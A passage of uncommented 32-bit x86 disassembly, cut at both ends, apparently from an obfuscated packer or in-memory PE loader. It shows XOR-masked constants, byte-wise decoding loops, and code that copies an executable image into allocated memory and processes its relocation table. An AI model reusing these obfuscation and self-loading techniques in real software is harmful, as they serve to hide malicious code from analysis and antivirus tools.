  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
  417cd3:	mov    DWORD PTR [ebp-0x6c],eax
  417cd6:	mov    DWORD PTR [ebp+0x1c],eax
  417cd9:	mov    DWORD PTR [edx],ecx
  417cdb:	mov    ecx,DWORD PTR [ebp-0x4]
  417cde:	mov    DWORD PTR [ecx],eax
  417ce0:	mov    eax,DWORD PTR [ebx+0x50]
  417ce3:	mov    DWORD PTR [ebp-0x68],eax
  417ce6:	mov    eax,DWORD PTR [ebp-0x1c]
  417ce9:	xor    eax,esi
  417ceb:	add    eax,edi
  417ced:	mov    DWORD PTR [ebp-0x64],eax
  417cf0:	lea    eax,[ebp-0x20]
  417cf3:	mov    DWORD PTR [ebp-0x60],eax
  417cf6:	lea    eax,[ebp-0x70]
  417cf9:	push   eax
  417cfa:	mov    eax,DWORD PTR [ebp+0x8]
  417cfd:	xor    eax,esi
  417cff:	add    eax,edi
  417d01:	push   eax
  417d02:	mov    eax,DWORD PTR [ebp+0x20]
  417d05:	add    eax,0xee
  417d0a:	push   eax
  417d0b:	mov    eax,DWORD PTR [ebp+0x20]
  417d0e:	mov    eax,DWORD PTR [eax+0x198]
  417d14:	mov    DWORD PTR [ebp-0x70],0x4
  417d1b:	push   DWORD PTR [eax]
  417d1d:	mov    eax,DWORD PTR [ebp+0x10]
  417d20:	call   eax
  417d22:	test   eax,eax
  417d24:	je     0x417d49
  417d26:	and    DWORD PTR [ebp+0xc],0x0
  417d2a:	cmp    DWORD PTR [ebx+0x50],0x0
  417d2e:	jbe    0x417d49
  417d30:	mov    eax,DWORD PTR [ebp+0x1c]
  417d33:	mov    ecx,DWORD PTR [ebp-0x10]
  417d36:	sub    ecx,eax
  417d38:	mov    dl,BYTE PTR [ecx+eax*1]
  417d3b:	inc    DWORD PTR [ebp+0xc]
  417d3e:	mov    BYTE PTR [eax],dl
  417d40:	mov    edx,DWORD PTR [ebp+0xc]
  417d43:	inc    eax
  417d44:	cmp    edx,DWORD PTR [ebx+0x50]
  417d47:	jb     0x417d38
  417d49:	mov    edx,DWORD PTR [ebp+0x1c]
  417d4c:	mov    ecx,DWORD PTR [edx+0x3c]
  417d4f:	add    ecx,edx
  417d51:	mov    eax,DWORD PTR [ecx+0xa0]
  417d57:	mov    ebx,DWORD PTR [ecx+0x28]
  417d5a:	add    eax,edx
  417d5c:	sub    edx,DWORD PTR [ebp-0x10]
  417d5f:	add    ebx,DWORD PTR [ebp+0x1c]
  417d62:	mov    DWORD PTR [ebp+0xc],edx
  417d65:	mov    DWORD PTR [ebp-0x2c],ecx
  417d68:	mov    DWORD PTR [ebp-0x14],ebx
  417d6b:	mov    DWORD PTR [ebp-0x8],0x0
  417d72:	jmp    0x417dee
  417d74:	add    edx,0xfffffff8
  417d77:	shr    edx,1
  417d79:	mov    DWORD PTR [ebp-0x18],edx
  417d7c:	je     0x417dda
  417d7e:	lea    edx,[eax+0x8]
  417d81:	mov    DWORD PTR [ebp-0x4],edx
  417d84:	mov    edx,DWORD PTR [ebp-0x18]
  417d87:	mov    DWORD PTR [ebp-0x18],edx
  417d8a:	mov    edx,DWORD PTR [ebp-0x4]
  417d8d:	movzx  edx,WORD PTR [edx]
  417d90:	mov    DWORD PTR [ebp-0x24],edx
  417d93:	and    edx,0xfff
  417d99:	mov    DWORD PTR [ebp-0x28],edx
  417d9c:	mov    edx,DWORD PTR [ebp-0x24]
  417d9f:	shr    edx,0xc
